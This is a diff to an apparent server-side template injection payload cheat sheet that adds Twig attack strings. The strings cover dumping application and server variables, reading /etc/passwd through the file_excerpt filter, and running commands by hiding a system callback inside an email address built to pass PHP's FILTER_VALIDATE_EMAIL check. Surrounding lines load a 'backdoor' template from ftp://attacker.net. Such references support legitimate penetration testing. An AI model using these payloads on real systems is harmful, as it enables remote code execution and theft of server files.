@@ -17,6 +17,7 @@
 * [Twig](#twig)
   * [Basic injection](#basic-injection)
   * [Template format](#template-format)
+  * [Arbitrary File Reading](#arbitrary-file-reading)
   * [Code execution](#code-execution)
 * [Smarty](#smarty)
 * [Freemarker](#freemarker)
@@ -126,6 +127,8 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 ```python
 {{7*7}}
 {{7*'7'}} would result in 49
+{{dump(app)}}
+{{app.request.server.all|join(',')}}
 ```
 
 ### Template format
@@ -142,12 +145,25 @@ $output = $twig > render (
 );
 ```
 
+### Arbitrary File Reading
+
+```python
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+```
+
 ### Code execution
 
 ```python
 {{self}}
 {{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+```
+
+Example with an email passing FILTER_VALIDATE_EMAIL PHP.
+
+```powershell
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
 ```
 
 ## Smarty
